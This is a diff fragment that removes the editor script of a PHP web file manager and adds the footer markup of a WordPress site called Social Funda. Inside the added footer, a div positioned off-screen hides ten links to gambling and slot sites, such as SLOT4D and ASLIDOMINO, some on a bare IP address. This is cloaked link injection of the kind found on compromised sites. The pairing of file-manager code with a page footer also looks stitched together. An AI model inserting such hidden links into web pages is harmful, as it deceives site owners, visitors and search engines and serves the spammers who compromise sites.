+<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-1627"><a href="https://socialfunda.net/insta-captions/" data-wpel-link="internal">Insta Captions</a></li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-3584"><a href="https://socialfunda.net/shayari/" data-wpel-link="internal">Shayari</a></li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-3585"><a href="https://socialfunda.net/quotes/" data-wpel-link="internal">Quotes</a></li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-6836"><a href="https://socialfunda.net/how-to/" data-wpel-link="internal">How To</a></li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-5117"><a href="https://socialfunda.net/about-us/" data-wpel-link="internal">About Us</a></li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-5115"><a href="https://socialfunda.net/contact-us/" data-wpel-link="internal">Contact Us</a></li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-5116"><a href="https://socialfunda.net/privacy-policy/" data-wpel-link="internal">Privacy Policy</a></li>
+</ul></div></section>	</div>
+</div><!-- .footer-widget3 -->
+					</div>
+										<div class="site-footer-middle-section-3 site-footer-section footer-section-inner-items-1">
+						<div class="footer-widget-area widget-area site-footer-focus-item footer-widget4 content-align-default content-tablet-align-default content-mobile-align-default content-valign-default content-tablet-valign-default content-mobile-valign-default" data-section="sidebar-widgets-footer4">
+	<div class="footer-widget-area-inner site-info-inner">
+		<section id="nav_menu-4" class="widget widget_nav_menu"><h2 class="widget-title">Our Links</h2><div class="collapse-sub-navigation"><ul id="menu-nav_menu-4" class="menu has-collapse-sub-nav"><li id="menu-item-1767" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1767"><a href="https://socialfunda.net/about-us/" data-wpel-link="internal">About Us</a></li>
+<li id="menu-item-1764" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1764"><a href="https://socialfunda.net/contact-us/" data-wpel-link="internal">Contact Us</a></li>
+<li id="menu-item-1766" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1766"><a href="https://socialfunda.net/privacy-policy/" data-wpel-link="internal">Privacy Policy</a></li>
+<li id="menu-item-1765" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1765"><a href="https://socialfunda.net/terms-and-conditions/" data-wpel-link="internal">Terms and Conditions</a></li>
+</ul></div></section>	</div>
+</div><!-- .footer-widget4 -->
+					</div>
+								</div>
+		</div>
+	</div>
+</div>
+<div class="site-bottom-footer-wrap site-footer-row-container site-footer-focus-item site-footer-row-layout-fullwidth site-footer-row-tablet-layout-default site-footer-row-mobile-layout-default" data-section="kadence_customizer_footer_bottom">
+	<div class="site-footer-row-container-inner">
+				<div class="site-container">
+			<div class="site-bottom-footer-inner-wrap site-footer-row site-footer-row-columns-2 site-footer-row-column-layout-equal site-footer-row-tablet-column-layout-default site-footer-row-mobile-column-layout-row ft-ro-dir-row ft-ro-collapse-normal ft-ro-t-dir-default ft-ro-m-dir-default ft-ro-lstyle-noline">
+									<div class="site-footer-bottom-section-1 site-footer-section footer-section-inner-items-1">
+						<div class="footer-widget-area widget-area site-footer-focus-item footer-social content-align-left content-tablet-align-default content-mobile-align-center content-valign-middle content-tablet-valign-default content-mobile-valign-top" data-section="kadence_customizer_footer_social">
+	<div class="footer-widget-area-inner footer-social-inner">
+		<div class="footer-social-wrap"><h2 class="widget-title">Join Us:</h2><div class="footer-social-inner-wrap element-social-inner-wrap social-show-label-true social-style-filled"><a href="https://www.facebook.com/socialfundda" target="_blank" rel="noopener noreferrer external" class="social-button footer-social-item social-link-facebook" data-wpel-link="external"><span class="kadence-svg-iconset"><svg class="kadence-svg-icon kadence-facebook-svg" fill="currentColor" version="1.1" xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 32 32"><title>Facebook</title><path d="M31.997 15.999c0-8.836-7.163-15.999-15.999-15.999s-15.999 7.163-15.999 15.999c0 7.985 5.851 14.604 13.499 15.804v-11.18h-4.062v-4.625h4.062v-3.525c0-4.010 2.389-6.225 6.043-6.225 1.75 0 3.581 0.313 3.581 0.313v3.937h-2.017c-1.987 0-2.607 1.233-2.607 2.498v3.001h4.437l-0.709 4.625h-3.728v11.18c7.649-1.2 13.499-7.819 13.499-15.804z"></path>
+				</svg></span><span class="social-label">Facebook</span></a><a href="https://twitter.com/SocialFundda" target="_blank" rel="noopener noreferrer external" class="social-button footer-social-item social-link-twitter" data-wpel-link="external"><span class="kadence-svg-iconset"><svg class="kadence-svg-icon kadence-twitter-x-svg" fill="currentColor" version="1.1" xmlns="http://www.w3.org/2000/svg" width="23" height="24" viewBox="0 0 23 24"><title>Twitter</title><path d="M13.969 10.157l8.738-10.157h-2.071l-7.587 8.819-6.060-8.819h-6.989l9.164 13.336-9.164 10.651h2.071l8.012-9.313 6.4 9.313h6.989l-9.503-13.831zM11.133 13.454l-8.316-11.895h3.181l14.64 20.941h-3.181l-6.324-9.046z"></path>
+				</svg></span><span class="social-label">Twitter</span></a><a href="https://www.instagram.com/socialfundda/" target="_blank" rel="noopener noreferrer external" class="social-button footer-social-item social-link-instagram" data-wpel-link="external"><span class="kadence-svg-iconset"><svg class="kadence-svg-icon kadence-instagram-svg" fill="currentColor" version="1.1" xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 32 32"><title>Instagram</title><path d="M21.138 0.242c3.767 0.007 3.914 0.038 4.65 0.144 1.52 0.219 2.795 0.825 3.837 1.821 0.584 0.562 0.987 1.112 1.349 1.848 0.442 0.899 0.659 1.75 0.758 3.016 0.021 0.271 0.031 4.592 0.031 8.916s-0.009 8.652-0.030 8.924c-0.098 1.245-0.315 2.104-0.743 2.986-0.851 1.755-2.415 3.035-4.303 3.522-0.685 0.177-1.304 0.26-2.371 0.31-0.381 0.019-4.361 0.024-8.342 0.024s-7.959-0.012-8.349-0.029c-0.921-0.044-1.639-0.136-2.288-0.303-1.876-0.485-3.469-1.784-4.303-3.515-0.436-0.904-0.642-1.731-0.751-3.045-0.031-0.373-0.039-2.296-0.039-8.87 0-2.215-0.002-3.866 0-5.121 0.006-3.764 0.037-3.915 0.144-4.652 0.219-1.518 0.825-2.795 1.825-3.833 0.549-0.569 1.105-0.975 1.811-1.326 0.915-0.456 1.756-0.668 3.106-0.781 0.374-0.031 2.298-0.038 8.878-0.038h5.13zM15.999 4.364v0c-3.159 0-3.555 0.014-4.796 0.070-1.239 0.057-2.084 0.253-2.824 0.541-0.765 0.297-1.415 0.695-2.061 1.342s-1.045 1.296-1.343 2.061c-0.288 0.74-0.485 1.586-0.541 2.824-0.056 1.241-0.070 1.638-0.070 4.798s0.014 3.556 0.070 4.797c0.057 1.239 0.253 2.084 0.541 2.824 0.297 0.765 0.695 1.415 1.342 2.061s1.296 1.046 2.061 1.343c0.74 0.288 1.586 0.484 2.825 0.541 1.241 0.056 1.638 0.070 4.798 0.070s3.556-0.014 4.797-0.070c1.239-0.057 2.085-0.253 2.826-0.541 0.765-0.297 1.413-0.696 2.060-1.343s1.045-1.296 1.343-2.061c0.286-0.74 0.482-1.586 0.541-2.824 0.056-1.241 0.070-1.637 0.070-4.797s-0.015-3.557-0.070-4.798c-0.058-1.239-0.255-2.084-0.541-2.824-0.298-0.765-0.696-1.415-1.343-2.061s-1.295-1.045-2.061-1.342c-0.742-0.288-1.588-0.484-2.827-0.541-1.241-0.056-1.636-0.070-4.796-0.070zM14.957 6.461c0.31-0 0.655 0 1.044 0 3.107 0 3.475 0.011 4.702 0.067 1.135 0.052 1.75 0.241 2.16 0.401 0.543 0.211 0.93 0.463 1.337 0.87s0.659 0.795 0.871 1.338c0.159 0.41 0.349 1.025 0.401 2.16 0.056 1.227 0.068 1.595 0.068 4.701s-0.012 3.474-0.068 4.701c-0.052 1.135-0.241 1.75-0.401 2.16-0.211 0.543-0.463 0.93-0.871 1.337s-0.794 0.659-1.337 0.87c-0.41 0.16-1.026 0.349-2.16 0.401-1.227 0.056-1.595 0.068-4.702 0.068s-3.475-0.012-4.702-0.068c-1.135-0.052-1.75-0.242-2.161-0.401-0.543-0.211-0.931-0.463-1.338-0.87s-0.659-0.794-0.871-1.337c-0.159-0.41-0.349-1.025-0.401-2.16-0.056-1.227-0.067-1.595-0.067-4.703s0.011-3.474 0.067-4.701c0.052-1.135 0.241-1.75 0.401-2.16 0.211-0.543 0.463-0.931 0.871-1.338s0.795-0.659 1.338-0.871c0.41-0.16 1.026-0.349 2.161-0.401 1.073-0.048 1.489-0.063 3.658-0.065v0.003zM16.001 10.024c-3.3 0-5.976 2.676-5.976 5.976s2.676 5.975 5.976 5.975c3.3 0 5.975-2.674 5.975-5.975s-2.675-5.976-5.975-5.976zM16.001 12.121c2.142 0 3.879 1.736 3.879 3.879s-1.737 3.879-3.879 3.879c-2.142 0-3.879-1.737-3.879-3.879s1.736-3.879 3.879-3.879zM22.212 8.393c-0.771 0-1.396 0.625-1.396 1.396s0.625 1.396 1.396 1.396 1.396-0.625 1.396-1.396c0-0.771-0.625-1.396-1.396-1.396v0.001z"></path>
+				</svg></span><span class="social-label">Instagram</span></a></div></div>	</div>
+</div><!-- data-section="footer_social" -->
+					</div>
+										<div class="site-footer-bottom-section-2 site-footer-section footer-section-inner-items-1">
+						
+<div class="footer-widget-area site-info site-footer-focus-item content-align-right content-tablet-align-default content-mobile-align-center content-valign-bottom content-tablet-valign-default content-mobile-valign-default" data-section="kadence_customizer_footer_html">
+	<div class="footer-widget-area-inner site-info-inner">
+		<div class="footer-html inner-link-style-normal"><div class="footer-html-inner"><p>&copy; 2026 <a href="https://socialfunda.net/" data-wpel-link="internal">Social Funda</a></p>
+</div></div>	</div>
+</div><!-- .site-info -->
+					</div>
+								</div>
+		</div>
+	</div>
+</div>
+	</div>
+</footer><!-- #colophon -->
+
+</div><!-- #wrapper -->
+
+
+
+			<script>document.documentElement.style.setProperty('--scrollbar-offset', window.innerWidth - document.documentElement.clientWidth + 'px' );</script>
+			<script type="speculationrules">
+{"prefetch":[{"source":"document","where":{"and":[{"href_matches":"/*"},{"not":{"href_matches":["/wp-*.php","/wp-admin/*","/wp-content/uploads/*","/wp-content/*","/wp-content/plugins/*","/wp-content/themes/kadence/*","/*\\?(.+)"]}},{"not":{"selector_matches":"a[rel~=\"nofollow\"]"}},{"not":{"selector_matches":".no-prefetch, .no-prefetch a"}}]},"eagerness":"conservative"}]}
 </script>
-<?php if (isset($_GET['edit']) && isset($_GET['env']) && FM_EDIT_FILE && !FM_READONLY):
-        
-        $ext = pathinfo($_GET["edit"], PATHINFO_EXTENSION);
-        $ext =  $ext == "js" ? "javascript" :  $ext;
-        ?>
-    <?php print_external('js-ace'); ?>
-    <script>
-        var editor = ace.edit("editor");
-        editor.getSession().setMode( {path:"ace/mode/<?php echo $ext; ?>", inline:true} );
-        //editor.setTheme("ace/theme/twilight"); //Dark Theme
-        editor.setShowPrintMargin(false); // Hide the vertical ruler
-        function ace_commend (cmd) { editor.commands.exec(cmd, editor); }
-        editor.commands.addCommands([{
-            name: 'save', bindKey: {win: 'Ctrl-S',  mac: 'Command-S'},
-            exec: function(editor) { edit_save(this, 'ace'); }
-        }]);
-        function renderThemeMode() {
-            var $modeEl = $("select#js-ace-mode"), $themeEl = $("select#js-ace-theme"), $fontSizeEl = $("select#js-ace-fontSize"), optionNode = function(type, arr){ var $Option = ""; $.each(arr, function(i, val) { $Option += "<option value='"+type+i+"'>" + val + "</option>"; }); return $Option; },
-                _data = {"aceTheme":{"bright":{"chrome":"Chrome","clouds":"Clouds","crimson_editor":"Crimson Editor","dawn":"Dawn","dreamweaver":"Dreamweaver","eclipse":"Eclipse","github":"GitHub","iplastic":"IPlastic","solarized_light":"Solarized Light","textmate":"TextMate","tomorrow":"Tomorrow","xcode":"XCode","kuroir":"Kuroir","katzenmilch":"KatzenMilch","sqlserver":"SQL Server"},"dark":{"ambiance":"Ambiance","chaos":"Chaos","clouds_midnight":"Clouds Midnight","dracula":"Dracula","cobalt":"Cobalt","gruvbox":"Gruvbox","gob":"Green on Black","idle_fingers":"idle Fingers","kr_theme":"krTheme","merbivore":"Merbivore","merbivore_soft":"Merbivore Soft","mono_industrial":"Mono Industrial","monokai":"Monokai","pastel_on_dark":"Pastel on dark","solarized_dark":"Solarized Dark","terminal":"Terminal","tomorrow_night":"Tomorrow Night","tomorrow_night_blue":"Tomorrow Night Blue","tomorrow_night_bright":"Tomorrow Night Bright","tomorrow_night_eighties":"Tomorrow Night 80s","twilight":"Twilight","vibrant_ink":"Vibrant Ink"}},"aceMode":{"javascript":"JavaScript","abap":"ABAP","abc":"ABC","actionscript":"ActionScript","ada":"ADA","apache_conf":"Apache Conf","asciidoc":"AsciiDoc","asl":"ASL","assembly_x86":"Assembly x86","autohotkey":"AutoHotKey","apex":"Apex","batchfile":"BatchFile","bro":"Bro","c_cpp":"C and C++","c9search":"C9Search","cirru":"Cirru","clojure":"Clojure","cobol":"Cobol","coffee":"CoffeeScript","coldfusion":"ColdFusion","csharp":"C#","csound_document":"Csound Document","csound_orchestra":"Csound","csound_score":"Csound Score","css":"CSS","curly":"Curly","d":"D","dart":"Dart","diff":"Diff","dockerfile":"Dockerfile","dot":"Dot","drools":"Drools","edifact":"Edifact","eiffel":"Eiffel","ejs":"EJS","elixir":"Elixir","elm":"Elm","erlang":"Erlang","forth":"Forth","fortran":"Fortran","fsharp":"FSharp","fsl":"FSL","ftl":"FreeMarker","gcode":"Gcode","gherkin":"Gherkin","gitignore":"Gitignore","glsl":"Glsl","gobstones":"Gobstones","golang":"Go","graphqlschema":"GraphQLSchema","groovy":"Groovy","haml":"HAML","handlebars":"Handlebars","haskell":"Haskell","haskell_cabal":"Haskell Cabal","haxe":"haXe","hjson":"Hjson","html":"HTML","html_elixir":"HTML (Elixir)","html_ruby":"HTML (Ruby)","ini":"INI","io":"Io","jack":"Jack","jade":"Jade","java":"Java","json":"JSON","jsoniq":"JSONiq","jsp":"JSP","jssm":"JSSM","jsx":"JSX","julia":"Julia","kotlin":"Kotlin","latex":"LaTeX","less":"LESS","liquid":"Liquid","lisp":"Lisp","livescript":"LiveScript","logiql":"LogiQL","lsl":"LSL","lua":"Lua","luapage":"LuaPage","lucene":"Lucene","makefile":"Makefile","markdown":"Markdown","mask":"Mask","matlab":"MATLAB","maze":"Maze","mel":"MEL","mixal":"MIXAL","mushcode":"MUSHCode","mysql":"MySQL","nix":"Nix","nsis":"NSIS","objectivec":"Objective-C","ocaml":"OCaml","pascal":"Pascal","perl":"Perl","perl6":"Perl 6","pgsql":"pgSQL","php_laravel_blade":"PHP (Blade Template)","php":"PHP","puppet":"Puppet","pig":"Pig","powershell":"Powershell","praat":"Praat","prolog":"Prolog","properties":"Properties","protobuf":"Protobuf","python":"Python","r":"R","razor":"Razor","rdoc":"RDoc","red":"Red","rhtml":"RHTML","rst":"RST","ruby":"Ruby","rust":"Rust","sass":"SASS","scad":"SCAD","scala":"Scala","scheme":"Scheme","scss":"SCSS","sh":"SH","sjs":"SJS","slim":"Slim","smarty":"Smarty","snippets":"snippets","soy_template":"Soy Template","space":"Space","sql":"SQL","sqlserver":"SQLServer","stylus":"Stylus","svg":"SVG","swift":"Swift","tcl":"Tcl","terraform":"Terraform","tex":"Tex","text":"Text","textile":"Textile","toml":"Toml","tsx":"TSX","twig":"Twig","typescript":"Typescript","vala":"Vala","vbscript":"VBScript","velocity":"Velocity","verilog":"Verilog","vhdl":"VHDL","visualforce":"Visualforce","wollok":"Wollok","xml":"XML","xquery":"XQuery","yaml":"YAML","django":"Django"},"fontSize":{8:8,10:10,11:11,12:12,13:13,14:14,15:15,16:16,17:17,18:18,20:20,22:22,24:24,26:26,30:30}};
-            if(_data && _data.aceMode) { $modeEl.html(optionNode("ace/mode/", _data.aceMode)); }
-            if(_data && _data.aceTheme) { var lightTheme = optionNode("ace/theme/", _data.aceTheme.bright), darkTheme = optionNode("ace/theme/", _data.aceTheme.dark); $themeEl.html("<optgroup label=\"Bright\">"+lightTheme+"</optgroup><optgroup label=\"Dark\">"+darkTheme+"</optgroup>");}
-            if(_data && _data.fontSize) { $fontSizeEl.html(optionNode("", _data.fontSize)); }
-            $modeEl.val( editor.getSession().$modeId );
-            $themeEl.val( editor.getTheme() );
-            $(function() { $fontSizeEl.val(12).change(); }); //set default font size in drop down
-        }
-
-        $(function(){
-            renderThemeMode();
-            $(".js-ace-toolbar").on("click", 'button', function(e){
-                e.preventDefault();
-                let cmdValue = $(this).attr("data-cmd"), editorOption = $(this).attr("data-option");
-                if(cmdValue && cmdValue != "none") {
-                    ace_commend(cmdValue);
-                } else if(editorOption) {
-                    if(editorOption == "fullscreen") {
-                        (void 0!==document.fullScreenElement&&null===document.fullScreenElement||void 0!==document.msFullscreenElement&&null===document.msFullscreenElement||void 0!==document.mozFullScreen&&!document.mozFullScreen||void 0!==document.webkitIsFullScreen&&!document.webkitIsFullScreen)
-                        &&(editor.container.requestFullScreen?editor.container.requestFullScreen():editor.container.mozRequestFullScreen?editor.container.mozRequestFullScreen():editor.container.webkitRequestFullScreen?editor.container.webkitRequestFullScreen(Element.ALLOW_KEYBOARD_INPUT):editor.container.msRequestFullscreen&&editor.container.msRequestFullscreen());
-                    } else if(editorOption == "wrap") {
-                        let wrapStatus = (editor.getSession().getUseWrapMode()) ? false : true;
-                        editor.getSession().setUseWrapMode(wrapStatus);
-                    }
-                }
-            });
-            $("select#js-ace-mode, select#js-ace-theme, select#js-ace-fontSize").on("change", function(e){
-                e.preventDefault();
-                let selectedValue = $(this).val(), selectionType = $(this).attr("data-type");
-                if(selectedValue && selectionType == "mode") {
-                    editor.getSession().setMode(selectedValue);
-                } else if(selectedValue && selectionType == "theme") {
-                    editor.setTheme(selectedValue);
-                }else if(selectedValue && selectionType == "fontSize") {
-                    editor.setFontSize(parseInt(selectedValue));
-                }
-            });
-        });
-    </script>
-<?php endif; ?>
-<div id="snackbar"></div>
-</body>
+<a id="kt-scroll-up" tabindex="-1" aria-hidden="true" aria-label="Scroll to top" href="#wrapper" class="kadence-scroll-to-top scroll-up-wrap scroll-ignore scroll-up-side-right scroll-up-style-outline vs-lg-true vs-md-true vs-sm-true"><span class="kadence-svg-iconset"><svg aria-hidden="true" class="kadence-svg-icon kadence-arrow-up-svg" fill="currentColor" version="1.1" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><title>Scroll to top</title><path d="M5.707 12.707l5.293-5.293v11.586c0 0.552 0.448 1 1 1s1-0.448 1-1v-11.586l5.293 5.293c0.391 0.391 1.024 0.391 1.414 0s0.391-1.024 0-1.414l-7-7c-0.092-0.092-0.202-0.166-0.324-0.217s-0.253-0.076-0.383-0.076c-0.256 0-0.512 0.098-0.707 0.293l-7 7c-0.391 0.391-0.391 1.024 0 1.414s1.024 0.391 1.414 0z"></path>
+				</svg></span></a><button id="kt-scroll-up-reader" href="#wrapper" aria-label="Scroll to top" class="kadence-scroll-to-top scroll-up-wrap scroll-ignore scroll-up-side-right scroll-up-style-outline vs-lg-true vs-md-true vs-sm-true"><span class="kadence-svg-iconset"><svg aria-hidden="true" class="kadence-svg-icon kadence-arrow-up-svg" fill="currentColor" version="1.1" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><title>Scroll to top</title><path d="M5.707 12.707l5.293-5.293v11.586c0 0.552 0.448 1 1 1s1-0.448 1-1v-11.586l5.293 5.293c0.391 0.391 1.024 0.391 1.414 0s0.391-1.024 0-1.414l-7-7c-0.092-0.092-0.202-0.166-0.324-0.217s-0.253-0.076-0.383-0.076c-0.256 0-0.512 0.098-0.707 0.293l-7 7c-0.391 0.391-0.391 1.024 0 1.414s1.024 0.391 1.414 0z"></path>
+				</svg></span></button><div style="position:absolute; left:-9999px; top:0;"><div style="position: absolute; left: -9999px; width: 1px; height: 1px; overflow: hidden;">
+<a href="https://magicpills.in/privacy-policy/" data-wpel-link="external" rel="external noopener noreferrer">SLOT4D</a>
+<a href="https://asli-domino.mybranchbob.com/" data-wpel-link="external" rel="external noopener noreferrer">ASLIDOMINO</a>
+<a href="https://betingslot.io/" data-wpel-link="external" rel="external noopener noreferrer">Situs Game Online</a>
+<a href="https://essentialsupplements.ph/faqs/" data-wpel-link="external" rel="external noopener noreferrer">ASLIDOMINO</a>
+<a href="https://prevetacare.com/contact-us/" data-wpel-link="external" rel="external noopener noreferrer">ASLIDOMINO</a>
+<a href="https://sskhannagirlsdc.ac.in/" data-wpel-link="external" rel="external noopener noreferrer">SLOT4D</a>
+<a href="http://63.250.38.170/aslidomino/" data-wpel-link="external" rel="external noopener noreferrer">ASLIDOMINO</a>
+<a href="https://pol-mare.pl/agencja-celna/" data-wpel-link="external" rel="external noopener noreferrer">SLOT QRIS</a>
+<a href="https://berkahpoker.us.com/" data-wpel-link="external" rel="external noopener noreferrer">Berkahpoker</a>
+<a href="https://escolasantamaria.com.br/contato/" data-wpel-link="external" rel="external noopener noreferrer">Aslidomino</a>
+</div></div>	<div id="mobile-drawer" class="popup-drawer popup-drawer-layout-sidepanel popup-drawer-animation-fade popup-drawer-side-left" data-drawer-target-string="#mobile-drawer"
+			>
+		<div class="drawer-overlay" data-drawer-target-string="#mobile-drawer"></div>
+		<div class="drawer-inner">
+						<div class="drawer-header">
+				<button class="menu-toggle-close drawer-toggle" aria-label="Close menu"  data-toggle-target="#mobile-drawer" data-toggle-body-class="showing-popup-drawer-from-left" aria-expanded="false" data-set-focus=".menu-toggle-open"
+							>
+					<span class="toggle-close-bar"></span>
+					<span class="toggle-close-bar"></span>
+				</button>
+			</div>
+			<div class="drawer-content mobile-drawer-content content-align-center content-valign-top">
+								<div class="site-header-item site-header-focus-item site-header-item-mobile-navigation mobile-navigation-layout-stretch-false" data-section="kadence_customizer_mobile_navigation">
+		<nav id="mobile-site-navigation" class="mobile-navigation drawer-navigation drawer-navigation-parent-toggle-false" role="navigation" aria-label="Primary Mobile Navigation">
+				<div class="mobile-menu-container drawer-menu-container">
+			<ul id="mobile-menu" class="menu has-collapse-sub-nav"><li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-home menu-item-768"><a href="https://socialfunda.net/" data-wpel-link="internal">Home</a></li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-30"><a href="https://socialfunda.net/facebook-bios/" data-wpel-link="internal">Facebook Bios</a></li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-970"><a href="https://socialfunda.net/insta-bios/" data-wpel-link="internal">Insta Bios</a></li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-1627"><a href="https://socialfunda.net/insta-captions/" data-wpel-link="internal">Insta Captions</a></li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-3584"><a href="https://socialfunda.net/shayari/" data-wpel-link="internal">Shayari</a></li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-3585"><a href="https://socialfunda.net/quotes/" data-wpel-link="internal">Quotes</a></li>
+<li class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-6836"><a href="https://socialfunda.net/how-to/" data-wpel-link="internal">How To</a></li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-5117"><a href="https://socialfunda.net/about-us/" data-wpel-link="internal">About Us</a></li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-5115"><a href="https://socialfunda.net/contact-us/" data-wpel-link="internal">Contact Us</a></li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-5116"><a href="https://socialfunda.net/privacy-policy/" data-wpel-link="internal">Privacy Policy</a></li>
+</ul>		</div>
+	</nav><!-- #site-navigation -->
+	</div><!-- data-section="mobile_navigation" -->
+<div class="site-header-item site-header-focus-item" data-section="kadence_customizer_mobile_social">
+	<div class="header-mobile-social-wrap"><div class="header-mobile-social-inner-wrap element-social-inner-wrap social-show-label-false social-style-filled"><a href="https://www.facebook.com/socialfundda" aria-label="Facebook" target="_blank" rel="noopener noreferrer external" class="social-button header-social-item social-link-facebook" data-wpel-link="external"><span class="kadence-svg-iconset"><svg class="kadence-svg-icon kadence-facebook-svg" fill="currentColor" version="1.1" xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 32 32"><title>Facebook</title><path d="M31.997 15.999c0-8.836-7.163-15.999-15.999-15.999s-15.999 7.163-15.999 15.999c0 7.985 5.851 14.604 13.499 15.804v-11.18h-4.062v-4.625h4.062v-3.525c0-4.010 2.389-6.225 6.043-6.225 1.75 0 3.581 0.313 3.581 0.313v3.937h-2.017c-1.987 0-2.607 1.233-2.607 2.498v3.001h4.437l-0.709 4.625h-3.728v11.18c7.649-1.2 13.499-7.819 13.499-15.804z"></path>
+				</svg></span></a><a href="https://twitter.com/SocialFundda" aria-label="Twitter" target="_blank" rel="noopener noreferrer external" class="social-button header-social-item social-link-twitter" data-wpel-link="external"><span class="kadence-svg-iconset"><svg class="kadence-svg-icon kadence-twitter-svg" fill="currentColor" version="1.1" xmlns="http://www.w3.org/2000/svg" width="26" height="28" viewBox="0 0 26 28"><title>Twitter</title><path d="M25.312 6.375c-0.688 1-1.547 1.891-2.531 2.609 0.016 0.219 0.016 0.438 0.016 0.656 0 6.672-5.078 14.359-14.359 14.359-2.859 0-5.516-0.828-7.75-2.266 0.406 0.047 0.797 0.063 1.219 0.063 2.359 0 4.531-0.797 6.266-2.156-2.219-0.047-4.078-1.5-4.719-3.5 0.313 0.047 0.625 0.078 0.953 0.078 0.453 0 0.906-0.063 1.328-0.172-2.312-0.469-4.047-2.5-4.047-4.953v-0.063c0.672 0.375 1.453 0.609 2.281 0.641-1.359-0.906-2.25-2.453-2.25-4.203 0-0.938 0.25-1.797 0.688-2.547 2.484 3.062 6.219 5.063 10.406 5.281-0.078-0.375-0.125-0.766-0.125-1.156 0-2.781 2.25-5.047 5.047-5.047 1.453 0 2.766 0.609 3.687 1.594 1.141-0.219 2.234-0.641 3.203-1.219-0.375 1.172-1.172 2.156-2.219 2.781 1.016-0.109 2-0.391 2.906-0.781z"></path>
+				</svg></span></a><a href="https://www.instagram.com/socialfundda/" aria-label="Instagram" target="_blank" rel="noopener noreferrer external" class="social-button header-social-item social-link-instagram" data-wpel-link="external"><span class="kadence-svg-iconset"><svg class="kadence-svg-icon kadence-instagram-svg" fill="currentColor" version="1.1" xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 32 32"><title>Instagram</title><path d="M21.138 0.242c3.767 0.007 3.914 0.038 4.65 0.144 1.52 0.219 2.795 0.825 3.837 1.821 0.584 0.562 0.987 1.112 1.349 1.848 0.442 0.899 0.659 1.75 0.758 3.016 0.021 0.271 0.031 4.592 0.031 8.916s-0.009 8.652-0.030 8.924c-0.098 1.245-0.315 2.104-0.743 2.986-0.851 1.755-2.415 3.035-4.303 3.522-0.685 0.177-1.304 0.26-2.371 0.31-0.381 0.019-4.361 0.024-8.342 0.024s-7.959-0.012-8.349-0.029c-0.921-0.044-1.639-0.136-2.288-0.303-1.876-0.485-3.469-1.784-4.303-3.515-0.436-0.904-0.642-1.731-0.751-3.045-0.031-0.373-0.039-2.296-0.039-8.87 0-2.215-0.002-3.866 0-5.121 0.006-3.764 0.037-3.915 0.144-4.652 0.219-1.518 0.825-2.795 1.825-3.833 0.549-0.569 1.105-0.975 1.811-1.326 0.915-0.456 1.756-0.668 3.106-0.781 0.374-0.031 2.298-0.038 8.878-0.038h5.13zM15.999 4.364v0c-3.159 0-3.555 0.014-4.796 0.070-1.239 0.057-2.084 0.253-2.824 0.541-0.765 0.297-1.415 0.695-2.061 1.342s-1.045 1.296-1.343 2.061c-0.288 0.74-0.485 1.586-0.541 2.824-0.056 1.241-0.070 1.638-0.070 4.798s0.014 3.556 0.070 4.797c0.057 1.239 0.253 2.084 0.541 2.824 0.297 0.765 0.695 1.415 1.342 2.061s1.296 1.046 2.061 1.343c0.74 0.288 1.586 0.484 2.825 0.541 1.241 0.056 1.638 0.070 4.798 0.070s3.556-0.014 4.797-0.070c1.239-0.057 2.085-0.253 2.826-0.541 0.765-0.297 1.413-0.696 2.060-1.343s1.045-1.296 1.343-2.061c0.286-0.74 0.482-1.586 0.541-2.824 0.056-1.241 0.070-1.637 0.070-4.797s-0.015-3.557-0.070-4.798c-0.058-1.239-0.255-2.084-0.541-2.824-0.298-0.765-0.696-1.415-1.343-2.061s-1.295-1.045-2.061-1.342c-0.742-0.288-1.588-0.484-2.827-0.541-1.241-0.056-1.636-0.070-4.796-0.070zM14.957 6.461c0.31-0 0.655 0 1.044 0 3.107 0 3.475 0.011 4.702 0.067 1.135 0.052 1.75 0.241 2.16 0.401 0.543 0.211 0.93 0.463 1.337 0.87s0.659 0.795 0.871 1.338c0.159 0.41 0.349 1.025 0.401 2.16 0.056 1.227 0.068 1.595 0.068 4.701s-0.012 3.474-0.068 4.701c-0.052 1.135-0.241 1.75-0.401 2.16-0.211 0.543-0.463 0.93-0.871 1.337s-0.794 0.659-1.337 0.87c-0.41 0.16-1.026 0.349-2.16 0.401-1.227 0.056-1.595 0.068-4.702 0.068s-3.475-0.012-4.702-0.068c-1.135-0.052-1.75-0.242-2.161-0.401-0.543-0.211-0.931-0.463-1.338-0.87s-0.659-0.794-0.871-1.337c-0.159-0.41-0.349-1.025-0.401-2.16-0.056-1.227-0.067-1.595-0.067-4.703s0.011-3.474 0.067-4.701c0.052-1.135 0.241-1.75 0.401-2.16 0.211-0.543 0.463-0.931 0.871-1.338s0.795-0.659 1.338-0.871c0.41-0.16 1.026-0.349 2.161-0.401 1.073-0.048 1.489-0.063 3.658-0.065v0.003zM16.001 10.024c-3.3 0-5.976 2.676-5.976 5.976s2.676 5.975 5.976 5.975c3.3 0 5.975-2.674 